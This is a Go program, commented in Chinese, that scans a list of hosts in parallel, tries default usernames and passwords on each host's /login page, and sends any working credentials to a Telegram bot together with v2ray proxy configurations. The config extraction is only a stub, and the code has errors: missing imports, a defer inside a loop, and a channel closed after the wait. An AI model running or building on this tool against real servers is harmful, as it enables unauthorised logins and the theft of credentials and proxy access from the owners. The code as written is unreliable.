package main

import (
	"encoding/json"
	"flag"
	"fmt"
	"log"
	"net/http"
	"os"
	"strings"
	"sync"
	"time"
)

var (
	tgBotToken = os.Getenv("TG_BOT_TOKEN") // Token 在此处修改
	tgChatID   = os.Getenv("TG_CHAT_ID")   // 频道ID
)

// 全局配置
var (
	concurrency int
	wg          sync.WaitGroup
	taskChan    = make(chan string)
)

type Target struct {
	Host string `json:"host"`
	IP   string `json:"ip"`
	Port string `json:"port"`
}

func init() {
	flag.IntVar(&concurrency, "c", 1, "并发数量")
	flag.Parse()
}

func sendTelegramNotification(targetURL, username, password string, v2rayConfigs []string) error {
	if tgBotToken == "" || tgChatID == "" {
		return fmt.Errorf("Telegram配置不完整")
	}

	client := &http.Client{
		Timeout: 10 * time.Second,
	}

	message := fmt.Sprintf(
		"🚨 *发现弱密码漏洞!*\n\n"+
			"🔗 *目标地址*: `%s`\n"+
			"👤 *用户名*: `%s`\n"+
			"🔑 *密码*: `%s`\n\n"+
			"📝 *提取的v2ray配置*:\n```\n%s\n```",
		targetURL, username, password, strings.Join(v2rayConfigs, "\n"))

	apiURL := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", tgBotToken)
	payload := map[string]interface{}{
		"chat_id":    tgChatID,
		"text":       message,
		"parse_mode": "MarkdownV2",
	}

	jsonData, _ := json.Marshal(payload)
	resp, err := client.Post(apiURL, "application/json", bytes.NewBuffer(jsonData))
	if err != nil {
		return fmt.Errorf("请求失败: %v", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("Telegram API返回错误: %s", resp.Status)
	}
	return nil
}

func loadTargets(filePath string) ([]string, error) {
	var targets []string

	file, err := os.ReadFile(filePath)
	if err != nil {
		return nil, fmt.Errorf("读取文件失败: %v", err)
	}

	lines := strings.Split(string(file), "\n")
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}

		var target Target
		if err := json.Unmarshal([]byte(line), &target); err != nil {
			log.Printf("解析 JSON 失败: %v", err)
			continue
		}

		if target.Host != "" {
			targets = append(targets, fmt.Sprintf("http://%s", target.Host))
		}
	}

	return targets, nil
}

func checkWeakPassword(targetURL string) {
	defer wg.Done()

	client := &http.Client{Timeout: 5 * time.Second}

	usernames := []string{"admin", "root", "test"}
	passwords := []string{"123456", "admin", "test"}

	for _, user := range usernames {
		for _, pass := range passwords {
			resp, err := client.PostForm(targetURL+"/login",
				url.Values{"username": {user}, "password": {pass}},
			)
			if err != nil {
				log.Printf("请求失败: %v", err)
				continue
			}
			defer resp.Body.Close()

			var result map[string]interface{}
			if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
				continue
			}

			if success, ok := result["success"].(bool); ok && success {
				log.Printf("[+] 发现弱密码: %s/%s", user, pass)

				v2rayConfigs := extractV2rayConfig(client, targetURL)
				if len(v2rayConfigs) > 0 {
					log.Println("[+] 提取的v2ray配置已保存")
				}

				if err := sendTelegramNotification(targetURL, user, pass, v2rayConfigs); err != nil {
					log.Printf("⚠️ 通知发送失败: %v", err)
				} else {
					log.Println("✓ 漏洞信息已推送至Telegram")
				}

				return
			}
		}
	}
}

func extractV2rayConfig(client *http.Client, targetURL string) []string {
	return []string{}
}

func main() {
	if len(os.Args) < 2 {
		log.Fatal("使用方法: ./program -c <并发数> <目标文件路径>")
	}

	targets, err := loadTargets(os.Args[len(os.Args)-1])
	if err != nil {
		log.Fatalf("加载目标文件失败: %v", err)
	}

	for i := 0; i < concurrency; i++ {
		go func() {
			for target := range taskChan {
				checkWeakPassword(target)
			}
		}()
	}

	for _, target := range targets {
		wg.Add(1)
		taskChan <- target
	}

	wg.Wait()
	close(taskChan)
}
